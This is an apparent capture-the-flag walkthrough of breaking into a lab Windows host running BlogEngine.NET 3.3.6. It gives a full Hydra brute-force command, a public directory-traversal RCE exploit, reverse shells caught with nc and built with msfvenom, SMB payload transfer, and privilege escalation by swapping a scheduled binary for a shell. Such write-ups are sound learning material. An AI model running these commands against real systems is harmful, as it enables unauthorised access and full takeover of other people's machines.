By navigating to the website is running on port `80` we can discover a login page located here:
```
http://10.10.37.35/Account/login.aspx?ReturnURL=/admin/
```

## Exploitation

All manual attempts to guess the password failed, let's try some good old brute force.

As we are trying to get access to the webserver, I normally would go for `Burp Suite` and it's built-in `Intruder` (Ctrl+I) or [TurboIntruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack).  
However, `Hydra` is a powerful Swiss Army knife in your arsenal, so let's have a look at `Hydra`'s syntax for instance.
First, capture the login attempt with `Burp Suite`, for example.
Second, specify a wordlist and the protocol, use `^USER^`, and `^PASS^` where it's needed, and don't forget to use the `:` as a separator.

For this web server we will need something like that:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt  10.10.37.35  http-post-form "/Account/login.aspx:__VIEWSTATE=f1XkCZ4kIN%2Bq%2B9IFJ%2FbMKkO52zKy84bKCcjkkfUsR4x3x%2F5fEkxpzV%2FRKXCMJuCsCKWpsKyzQK4aARoel4q7itZn9osOnSwWsHTgXeEJhgeFpWIv7IOa717%2Fse9rAljZe9dyFtPdvl7uTYZzRGKtW8hqV%2F1Np0H5BAVotuzLmN3%2FCbDw&__EVENTVALIDATION=GtojKnDeo2jldhCXNJBmvWGBP6cDL8kpk8%2F34UpQahQt23y3jWrXbS41IEutWfw6i15bxNkkkxKzaIjD0gWVqUh0PHxU7p4EuDWXsz4V8iZPoUpU7L9gxEwweFHlQmLSfuhVzsF4B0wIJNMDaqdpnX9H469MYRbw1gbwrHAzrtaH0B%2FV&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

[80][http-post-form] host: 10.10.37.35   login: admin   password: ********
```
Pay attention to the `:Login failed` at the end of the command. This is the response from the webserver on an attempt to sign in with incorrect credentials. It will be different on other boxes.

Now we have access to the `Admin` section of the site. By navigating to the `About` page, we can learn that version of the engine is `3.3.6.0`.
Check available exploits:
```
searchsploit BlogEngine.NET 3.3.6
```

 Exploit Title | Path
 --- | ---
 BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution | aspx/webapps/46353.cs
 BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code | aspx/webapps/47010.py
 BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal | aspx/webapps/47035.py
 BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution | aspx/webapps/47011.py
 BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection | aspx/webapps/47014.py



Our goal is to get the shell, so let's try `RCE` first:
```
searchsploit -m aspx/webapps/46353.cs
```
Move mentioned in the exploit part of the script to the file `PostView.ascx`.
Navigate to the edit page and upload the file via the `File manager` option:
```
http://10.10.37.35/admin/app/editor/editpost.cshtml
```
Open a session of `nc` listener on mentioned in the exploit port.
To trigger the shell you should navigate to `?theme=../../App_Data/files`
```
10.10.37.35/?theme=../../App_Data/files
```
Catch your shell:
```
sudo nc -nlvp 4445
listening on [any] 4445 ...
connect to [10.11.19.53] from (UNKNOWN) [10.10.37.35] 49274
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

This shell is not so stable, so let's generate another one:
```
msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=10.11.19.53 LPORT=53 -f exe -o shell.exe
```
Let's use [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) this time to upload the shell.
Navigate to the folder which you would like to share via `SMB` and type the following:
```
smbserver.py carrotcake .
```
On the client:
```
cd C:\Windows\Temp
copy \\10.11.19.53\carrotcake\shell.exe

C:\Windows\Temp>copy \\10.11.19.53\carrotcake\shell.exe
        1 file(s) copied.
```
Open the `nc` listener on port `53` and run the shell:
```
C:\Windows\Temp>shell.exe
```

---

## PrivEsc

And again, no `Metasploit` this time.

Grab a `x86` version of `winPEAS` from [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/x86/Release).
Upload it to the client the same way as you just did with the shell.

`WinPEAS` will highlight the uncommon binary:
```
WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running  
```
Navigate to the `C:\Program Files (x86)\SystemScheduler\Events` to check logs.  
It seems that `Message.exe` is constantly restarting by `Administrator`:
```
10/15/20 11:52:06,Process Ended. PID:1528,ExitCode:956628994,Message.exe (Administrator)
10/15/20 11:53:05,Event Started Ok, (Administrator)
10/15/20 11:53:07,Process Ended. PID:1656,ExitCode:956628994,Message.exe (Administrator)
10/15/20 11:54:06,Event Started Ok, (Administrator)
10/15/20 11:54:07,Process Ended. PID:1804,ExitCode:956628994,Message.exe (Administrator)
10/15/20 11:55:06,Event Started Ok, (Administrator)
10/15/20 11:55:07,Process Ended. PID:32,ExitCode:956628994,Message.exe (Administrator)
10/15/20 11:56:06,Event Started Ok, (Administrator)
10/15/20 11:56:07,Process Ended. PID:1440,ExitCode:956628994,Message.exe (Administrator)
```

Let's try to replace the `Message.exe` by a reverse shell:

```
C:\Program Files (x86)\SystemScheduler>ren Message.exe Message.exe.old
C:\Program Files (x86)\SystemScheduler>copy \\10.11.19.53\carrotcake\shell.exe
        1 file(s) copied.
C:\Program Files (x86)\SystemScheduler>ren shell.exe Message.exe
```

Open another session of `nc` and wait about 30 seconds.
Hooray, you got the `Administrator` shell.

## Takeaway
- Always pay attention to the logs if you're stuck
- Nothing is wrong with `Metasploit`. Just make sure that you understand how the exploits that you're using works under the cape.
- Some exploits (especially if you are exploiting CRON jobs) will test your patience
